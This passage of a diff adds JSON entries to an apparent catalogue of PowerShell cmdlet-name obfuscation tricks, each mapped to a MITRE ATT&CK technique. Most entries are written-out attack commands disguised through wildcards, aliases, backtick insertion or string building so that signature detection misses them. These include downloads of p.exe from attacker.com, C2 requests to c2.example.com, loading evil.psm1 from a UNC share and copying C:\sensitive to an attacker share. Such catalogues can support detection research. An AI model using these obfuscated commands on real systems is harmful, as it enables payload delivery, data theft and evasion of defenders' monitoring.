+        "Pattern": "py*3",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'thon'"
+      },
+      {
+        "Pattern": "pyth[o]n3",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on 'o'"
+      },
+      {
+        "Pattern": "python[3]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on version digit"
+      },
+      {
+        "Pattern": "/usr/bin/python?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard on version"
+      },
+      {
+        "Pattern": "/???/bin/p*3",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      },
+      {
+        "Pattern": "/opt/homebrew/bin/python?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Homebrew install path"
+      }
+    ],
+    "PlatformNotes": "On macOS, `/usr/bin/python3` may require Xcode CLI tools. Apple Silicon Macs use `/opt/homebrew/bin/python3` for Homebrew installs. Use full paths for reliability.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/006/",
+      "https://docs.python.org/3/"
+    ]
+  },
+  {
+    "Name": "Add-Type",
+    "Description": "Compile and load C# or other .NET language code at runtime. Enables direct Windows API access and arbitrary .NET code execution without touching disk.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm A*-T*) -TypeDefinition 'public class C { ... }'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards on both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Add-Ty*) -TypeDefinition ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches 'pe'"
+      },
+      {
+        "Pattern": "& (gcm A?d-Type) -TypeDefinition ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'd'"
+      },
+      {
+        "Pattern": "& (gcm *-Type) -TypeDefinition ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard \u2014 use -CommandType Cmdlet to limit results"
+      },
+      {
+        "Pattern": "& (gcm A*-T*) -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern ...' -Name Win32 -Namespace API",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "-MemberDefinition form for P/Invoke \u2014 inline DllImport without a full class definition"
+      },
+      {
+        "Pattern": "& (gcm A[c-e]d-Type) -TypeDefinition 'public class C { ... }'",
+        "Wildcards": [
+          "[c-e]"
+        ],
+        "Notes": "Character range [c-e] matches 'd' in Add \u2014 only character in range that satisfies Add-Type"
+      },
+      {
+        "Pattern": "& ($ExecutionContext.InvokeCommand.GetCommand('A*-Type','Cmdlet')) -TypeDefinition 'public class C { ... }'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Engine-level cmdlet resolution via InvokeCommand.GetCommand \u2014 bypasses Get-Command entirely; A*-Type resolves to Add-Type",
+        "Method": "ExecutionContext resolution"
+      },
+      {
+        "Pattern": "& (gcm ('{0}dd-{1}' -f 'A','Type')) -TypeDefinition 'public class C { ... }'",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs the cmdlet name 'Add-Type' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      }
+    ],
+    "PlatformNotes": "Add-Type compiles C# code in memory (using the .NET compiler) and loads the resulting assembly into the PowerShell session. It enables P/Invoke for Windows API calls: `Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] ...' -Name Win32 -Namespace API`. No files are written to disk by default when using `-TypeDefinition` or `-MemberDefinition`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type"
+    ]
+  },
+  {
+    "Name": "Copy-Item",
+    "Description": "Copy files and directories. Used for staging payloads, copying sensitive data for exfiltration, or lateral file movement.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "exfiltration",
+    "MitreID": "T1048",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm C*-I*m) -Path C:\\sensitive -Destination \\\\attacker\\share",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Copy-It*) -Path ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'em'"
+      },
+      {
+        "Pattern": "& (gcm C?py-Item) -Path ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'o'"
+      },
+      {
+        "Pattern": "& (gcm C[n-p]py-Item) -Path ...",
+        "Wildcards": [
+          "[n-p]"
+        ],
+        "Notes": "Character range matches 'o' in Copy"
+      },
+      {
+        "Pattern": "copy -Path src -Destination dst",
+        "Wildcards": [],
+        "Notes": "Alias 'copy' for Copy-Item"
+      },
+      {
+        "Pattern": "cp -Path src -Destination dst",
+        "Wildcards": [],
+        "Notes": "Alias 'cp' for Copy-Item"
+      },
+      {
+        "Pattern": "cpi -Path src -Destination dst",
+        "Wildcards": [],
+        "Notes": "Alias 'cpi' for Copy-Item"
+      },
+      {
+        "Pattern": "& (gal cp?) -Path src -Destination dst",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias with wildcard resolves 'cpi' \u2014 cp? avoids matching 'cli' (Clear-Item)"
+      },
+      {
+        "Pattern": "& (gcm *-Item) -Path ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard \u2014 note: matches Get-Item, Set-Item etc."
+      },
+      {
+        "Pattern": "& (DIR Alias:/cp?) -Path src -Destination dst",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves cpi alias via PowerShell's Alias: PSDrive glob \u2014 cp? matches cpi (not cp, which is 2 chars)"
+      },
+      {
+        "Pattern": "& (gcm * | ? Name -match '^Co.*Item') -Path src -Destination dst",
+        "Wildcards": [
+          "-match"
+        ],
+        "Notes": "Regex -match filter on all commands via Where-Object pipeline \u2014 regex alternative to glob wildcards"
+      },
+      {
+        "Pattern": "& (gcm ('{0}-{1}' -f 'Copy','Item')) -Path src -Destination dst",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Copy-Item' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      },
+      {
+        "Pattern": "& (gcm ('Copy'+''+'-Item')) -Path src -Destination dst",
+        "Wildcards": [],
+        "Notes": "String concatenation builds the cmdlet name from literals \u2014 name never appears contiguous in source",
+        "Method": "String concatenation"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1048/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item"
+    ]
+  },
+  {
+    "Name": "Get-Content",
+    "Description": "Read file contents. Equivalent to cat on Linux. Used to read sensitive files, credentials, and configuration data.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "discovery",
+    "MitreID": "T1005",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm G*-C*t) C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Get-Con*) ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'tent'"
+      },
+      {
+        "Pattern": "& (gcm G?t-Content) ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "& (gcm G[d-f]t-Content) ...",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Get"
+      },
+      {
+        "Pattern": "gc C:\\sensitive\\file.txt",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'gc' for Get-Content"
+      },
+      {
+        "Pattern": "cat C:\\sensitive\\file.txt",
+        "Wildcards": [],
+        "Notes": "Alias 'cat' also works in PowerShell"
+      },
+      {
+        "Pattern": "type C:\\sensitive\\file.txt",
+        "Wildcards": [],
+        "Notes": "Alias 'type' also resolves to Get-Content"
+      },
+      {
+        "Pattern": "& (gcm *Content) ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard"
+      },
+      {
+        "Pattern": "& (DIR Alias:/g?) C:\\sensitive\\file.txt",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves gc alias via PowerShell's Alias: PSDrive glob \u2014 g? matches gc (Get-Content)"
+      },
+      {
+        "Pattern": "& (gcm ('{0}et-{1}' -f 'G','Content')) C:\\sensitive\\file.txt",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Get-Content' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1005/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content"
+    ]
+  },
+  {
+    "Name": "Import-Module",
+    "Description": "Load PowerShell modules from disk, UNC paths, or the module store. Used to load malicious modules containing custom cmdlets or offensive toolkits.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm I*-M*) -Name \\\\attacker.com\\share\\evil.psm1",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards on both verb and noun \u2014 loads module from UNC path"
+      },
+      {
+        "Pattern": "& (gcm Import-M*) -Name evil.psm1",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches 'odule'"
+      },
+      {
+        "Pattern": "& (gcm I?port-Module) -Name evil.psm1",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'm'"
+      },
+      {
+        "Pattern": "ipmo -Name evil.psm1",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'ipmo' for Import-Module"
+      },
+      {
+        "Pattern": "& (gal ip?o) -Name evil.psm1",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias with wildcard resolves 'ipmo'"
+      },
+      {
+        "Pattern": "& (gcm I[l-n]port-Module) -Name evil.psm1",
+        "Wildcards": [
+          "[l-n]"
+        ],
+        "Notes": "Character range [l-n] matches 'm' in Import \u2014 only character in range that satisfies Import-Module"
+      },
+      {
+        "Pattern": "& (gcm *-Module) -Name evil.psm1",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard on noun \u2014 note: may match other *-Module cmdlets; add -CommandType Cmdlet to limit"
+      },
+      {
+        "Pattern": "& (gcm ('{0}port-{1}' -f 'Im','Module')) -Name evil.psm1",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Import-Module' from fragments before gcm resolves it",
+        "Method": "-f format operator"
+      }
+    ],
+    "PlatformNotes": "Import-Module loads `.psm1`, `.psd1`, or `.dll` files. It can load from UNC paths (`\\\\server\\share\\module.psm1`) for living-off-the-land network staging. The `ipmo` alias is built-in. Modules can contain arbitrary cmdlets and functions that execute on import via `$PSDefaultParameterValues` or module scripts.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module"
+    ]
+  },
+  {
+    "Name": "Invoke-Command",
+    "Description": "Run commands on local or remote computers. Enables lateral movement via PowerShell remoting (WinRM).",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "lateral-movement",
+    "MitreID": "T1021.006",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm I*-C*d) -ComputerName TARGET -ScriptBlock { whoami }",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Invoke-Com*) -ComputerName ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'mand'"
+      },
+      {
+        "Pattern": "& (gcm I*ke-Command) -ComputerName ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard in verb"
+      },
+      {
+        "Pattern": "& (gcm *-Command) -ComputerName ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard"
+      },
+      {
+        "Pattern": "icm -ComputerName TARGET -ScriptBlock { id }",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'icm'"
+      },
+      {
+        "Pattern": "& (gcm Invok[d-f]-Command) -ComputerName ...",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Invoke"
+      },
+      {
+        "Pattern": "& (gal ic?) -ComputerName TARGET -ScriptBlock { id }",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias with wildcard resolves 'icm'"
+      },
+      {
+        "Pattern": "& (DIR Alias:/ic?) -ComputerName TARGET -ScriptBlock { whoami }",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves icm alias via PowerShell's Alias: PSDrive glob \u2014 ic? matches icm (Invoke-Command)"
+      },
+      {
+        "Pattern": "& (gcm ('{0}voke-{1}' -f 'In','Command')) -ComputerName TARGET -ScriptBlock { whoami }",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Invoke-Command' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      },
+      {
+        "Pattern": "& (Get-Command -Verb Inv* -Noun *Command) -ComputerName TARGET -ScriptBlock { whoami }",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Get-Command -Verb/-Noun structured split \u2014 wildcards on verb and noun independently narrow the match to Invoke-Command",
+        "Method": "Get-Command -Verb -Noun"
+      },
+      {
+        "Pattern": "& (gcm `I`n`v`o`k`e-Command) -ComputerName TARGET -ScriptBlock { whoami }",
+        "Wildcards": [],
+        "Notes": "Backtick character insertion \u2014 PowerShell ignores backticks before most characters, so the name resolves normally but string-matching signatures miss it",
+        "Method": "Backtick insertion"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1021/006/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command"
+    ]
+  },
+  {
+    "Name": "Invoke-Expression",
+    "Description": "Execute arbitrary strings as PowerShell commands. The most direct code execution primitive \u2014 equivalent to eval().",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm I*ke-E*) 'Get-Process'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in both verb and noun"
+      },
+      {
+        "Pattern": "& (gal i?x) 'whoami'",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias (gal) with wildcard \u2014 'iex' is the alias for Invoke-Expression"
+      },
+      {
+        "Pattern": "& (gal ?ex) 'whoami'",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard prefix on 'iex' alias \u2014 uniquely matches iex"
+      },
+      {
+        "Pattern": "iex 'whoami'",
+        "Wildcards": [],
+        "Notes": "Direct alias use \u2014 not a glob but the canonical short form"
+      },
+      {
+        "Pattern": "& (gcm *xpression) 'payload'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard prefix matches 'Invoke-E'"
+      },
+      {
+        "Pattern": "& (gcm Invoke-Ex*) 'payload'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard suffix matches 'pression'"
+      },
+      {
+        "Pattern": "& (Get-Alias i?x) 'payload'",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full Get-Alias with wildcard"
+      },
+      {
+        "Pattern": "& (gcm Invok[d-f]-Expression) 'payload'",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Invoke"
+      },
+      {
+        "Pattern": "& (DIR Alias:/I*X) 'payload'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Resolves IEX alias via PowerShell's Alias: PSDrive glob \u2014 filesystem-style wildcard on the Alias provider"
+      },
+      {
+        "Pattern": "& (gcm ('{0}voke-{1}' -f 'In','Expression')) 'payload'",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs the cmdlet name string from fragments before gcm resolves it"
+      },
+      {
+        "Pattern": "& (gcm * | ? Name -match '^Inv.*Expr') 'payload'",
+        "Wildcards": [
+          "-match"
+        ],
+        "Notes": "Regex -match filter on all commands via Where-Object pipeline \u2014 regex alternative to glob wildcards"
+      },
+      {
+        "Pattern": "& (Get-Command -Verb Inv* -Noun *Expression) 'payload'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Get-Command -Verb/-Noun structured split \u2014 wildcards on verb and noun independently, narrowing match to Invoke-Expression",
+        "Method": "Get-Command -Verb -Noun"
+      },
+      {
+        "Pattern": "& ($ExecutionContext.InvokeCommand.GetCommand('I*-Expression','Cmdlet')) 'payload'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Engine-level cmdlet resolution via InvokeCommand.GetCommand \u2014 bypasses Get-Command entirely; I*-Expression resolves to Invoke-Expression",
+        "Method": "ExecutionContext resolution"
+      },
+      {
+        "Pattern": "& (gcm ('Inv'+'oke-Ex'+'pression')) 'payload'",
+        "Wildcards": [],
+        "Notes": "String concatenation builds the cmdlet name from three fragments \u2014 full name never appears contiguous in source",
+        "Method": "String concatenation"
+      },
+      {
+        "Pattern": "$c = gcm *-Expr*; & $c 'whoami'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Variable-based invocation \u2014 glob resolves to Invoke-Expression at assignment time; & invokes the stored CommandInfo object",
+        "Method": "Variable invocation"
+      },
+      {
+        "Pattern": "& (gcm `I`n`v`o`k`e-Expression) 'payload'",
+        "Wildcards": [],
+        "Notes": "Backtick character insertion \u2014 PowerShell ignores backticks before most characters, so the name resolves normally but string-matching signatures miss it",
+        "Method": "Backtick insertion"
+      },
+      {
+        "Pattern": "& (gcm Microsoft.PowerShell.Utility\\Inv*-Expr*) 'payload'",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Module-qualified wildcard \u2014 specifying the module namespace forces resolution within Microsoft.PowerShell.Utility while still using glob patterns",
+        "Method": "Module-qualified wildcard"
+      }
+    ],
+    "PlatformNotes": "`iex` is a built-in alias. `Invoke-Expression` is one of the most monitored cmdlets. Wildcards on the cmdlet name via `gcm` or `gal` can bypass signature-based detections. Also works with base64: `iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...')))`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression",
+      "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
+    ]
+  },
+  {
+    "Name": "Invoke-RestMethod",
+    "Description": "Send HTTP/HTTPS requests and receive structured responses. Used for C2 communication, API interactions, and payload retrieval.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm I*-R*M*) -Uri http://c2.example.com/cmd",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in verb and both parts of noun"
+      },
+      {
+        "Pattern": "& (gcm Invoke-Rest*) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'Method'"
+      },
+      {
+        "Pattern": "& (gcm I*ke-RestMethod) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard in verb only"
+      },
+      {
+        "Pattern": "& (gcm *RestMethod) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard"
+      },
+      {
+        "Pattern": "irm -Uri ...",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'irm' \u2014 not a glob but used in combination"
+      },
+      {
+        "Pattern": "& (gcm Invok[d-f]-RestMethod) -Uri ...",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Invoke"
+      },
+      {
+        "Pattern": "& (gal ir?) -Uri ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias with wildcard resolves 'irm'"
+      },
+      {
+        "Pattern": "& (gcm *-Rest*od) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Multiple wildcards with partial matching"
+      },
+      {
+        "Pattern": "& (DIR Alias:/ir?) -Uri http://...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves irm alias via PowerShell's Alias: PSDrive glob"
+      },
+      {
+        "Pattern": "& (gcm * | ? Name -match 'Rest') -Uri http://c2.example.com/cmd",
+        "Wildcards": [
+          "-match"
+        ],
+        "Notes": "Regex -match filter on all commands via Where-Object pipeline \u2014 'Rest' uniquely matches Invoke-RestMethod"
+      },
+      {
+        "Pattern": "& (Get-Command -Verb Inv* -Noun *RestMethod) -Uri http://c2.example.com/cmd",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Get-Command -Verb/-Noun structured split \u2014 wildcards on verb and noun independently narrow the match to Invoke-RestMethod",
+        "Method": "Get-Command -Verb -Noun"
+      },
+      {
+        "Pattern": "& (gcm Microsoft.PowerShell.Utility\\Inv*-Rest*) -Uri http://c2.example.com/cmd",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Module-qualified wildcard \u2014 forces resolution within Microsoft.PowerShell.Utility while using glob patterns on the cmdlet name",
+        "Method": "Module-qualified wildcard"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod",
+      "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
+    ]
+  },
+  {
+    "Name": "Invoke-WebRequest",
+    "Description": "Download files or interact with web services. PowerShell's built-in HTTP client, commonly used for payload staging.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet (System.Net.WebClient wrapper)"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm I*oke-W*R*) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Get-Command (gcm) resolves cmdlet by wildcard. I*oke matches Invoke, W*R* matches WebRequest"
+      },
+      {
+        "Pattern": "& (gcm Inv?ke-WebRequest) -Uri ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'o'"
+      },
+      {
+        "Pattern": "& (gcm I*-W*t) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Abbreviated wildcards, still resolves to Invoke-WebRequest"
+      },
+      {
+        "Pattern": "iwr -Uri ...",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'iwr' \u2014 not a glob but commonly used obfuscation"
+      },
+      {
+        "Pattern": "curl -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "Alias 'curl' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
+      },
+      {
+        "Pattern": "wget -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "Alias 'wget' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
+      },
+      {
+        "Pattern": "& (Get-Command *Web*quest) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Full Get-Command with wildcards around 'Web'"
+      },
+      {
+        "Pattern": "& (gcm *-WebR*) -Uri ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard before verb and in noun"
+      },
+      {
+        "Pattern": "& (gcm Invok[d-f]-WebRequest) -Uri ...",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Invoke"
+      },
+      {
+        "Pattern": "& (gal i?r) -Uri ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias with wildcard resolves 'iwr'"
+      },
+      {
+        "Pattern": "& (DIR Alias:/iw?) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves iwr alias via PowerShell's Alias: PSDrive glob \u2014 iw? matches iwr (Invoke-WebRequest)"
+      },
+      {
+        "Pattern": "& (gcm * | ? Name -match '^Inv.*WebR') -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "-match"
+        ],
+        "Notes": "Regex -match filter on all commands via Where-Object pipeline \u2014 regex alternative to glob wildcards"
+      },
+      {
+        "Pattern": "& (gcm ('{0}voke-{1}' -f 'In','WebRequest')) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Invoke-WebRequest' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      },
+      {
+        "Pattern": "& (Get-Command -Verb Inv* -Noun *WebRequest) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Get-Command -Verb/-Noun structured split \u2014 wildcards on verb and noun independently narrow the match to Invoke-WebRequest",
+        "Method": "Get-Command -Verb -Noun"
+      },
+      {
+        "Pattern": "& ($ExecutionContext.InvokeCommand.GetCommand('I*-WebRequest','Cmdlet')) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Engine-level cmdlet resolution via InvokeCommand.GetCommand \u2014 bypasses Get-Command entirely; I*-WebRequest resolves to Invoke-WebRequest",
+        "Method": "ExecutionContext resolution"
+      },
+      {
+        "Pattern": "& (gcm ('Inv'+'oke-We'+'bRequest')) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "String concatenation builds the cmdlet name from three fragments \u2014 full name never appears contiguous in source",
+        "Method": "String concatenation"
+      },
+      {
+        "Pattern": "$c = gcm *-WebR*; & $c -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Variable-based invocation \u2014 glob resolves to Invoke-WebRequest at assignment time; & invokes the stored CommandInfo object",
+        "Method": "Variable invocation"
+      },
+      {
+        "Pattern": "& (gcm `I`n`v`o`k`e-WebRequest) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "Backtick character insertion \u2014 PowerShell ignores backticks before most characters, so the name resolves normally but string-matching signatures miss it",
+        "Method": "Backtick insertion"
+      },
+      {
+        "Pattern": "& (gcm Microsoft.PowerShell.Utility\\Inv*-WebR*) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Module-qualified wildcard \u2014 forces resolution within Microsoft.PowerShell.Utility while using glob patterns on the cmdlet name",
+        "Method": "Module-qualified wildcard"
+      }
+    ],
+    "PlatformNotes": "PowerShell cmdlet name resolution supports wildcards via `Get-Command`. The pattern `& (gcm Wildcard*Pattern) -Args` is idiomatic \"globfuscation\". The `&` operator invokes the resolved cmdlet. Aliases like `iwr`, `curl`, `wget` also resolve to Invoke-WebRequest.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest"
+    ]
+  },
+  {
+    "Name": "New-Object",
+    "Description": "Creates .NET or COM objects. Used to instantiate WebClient for downloads, create COM shells, or access Windows APIs.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm N*-Obj*) System.Net.WebClient",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards on both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm New-Ob*) System.Net.WebClient",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ject'"
+      },
+      {
+        "Pattern": "& (gcm N?w-Object) System.Net.WebClient",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "& (gcm N[d-f]w-Object) System.Net.WebClient",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in New"
+      },
+      {
+        "Pattern": "(& (gcm N*-Obj*) Net.WebClient).DownloadFile('http://...','C:\\p.exe')",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Full download one-liner with glob-resolved cmdlet"
+      },
+      {
+        "Pattern": "& (gcm *Object) Net.WebClient",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard"
+      },
+      {
+        "Pattern": "(& (gcm N*-Obj*) -ComObject MsXml2.ServerXmlHttp).Open('GET','http://...',$false)",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "gcm glob on New-Object; -ComObject instantiates MsXml2.ServerXmlHttp COM object"
+      },
+      {
+        "Pattern": "(& (gcm N?w-Ob*) -ComObject MsXml2.ServerXmlHttp).Open('GET','http://...',$false)",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Mixed ? and * wildcards on New-Object with -ComObject"
+      },
+      {
+        "Pattern": "$w=New-Object Net.WebClient;$w.(($w.PsObject.Methods|?{$_.Name-clike'D*g'}).Name).Invoke('http://...')",
+        "Wildcards": [
+          "-clike"
+        ],
+        "Notes": "-clike 'D*g' resolves DownloadString method on Net.WebClient via PSObject.Methods",
+        "Method": "DownloadString"
+      },
+      {
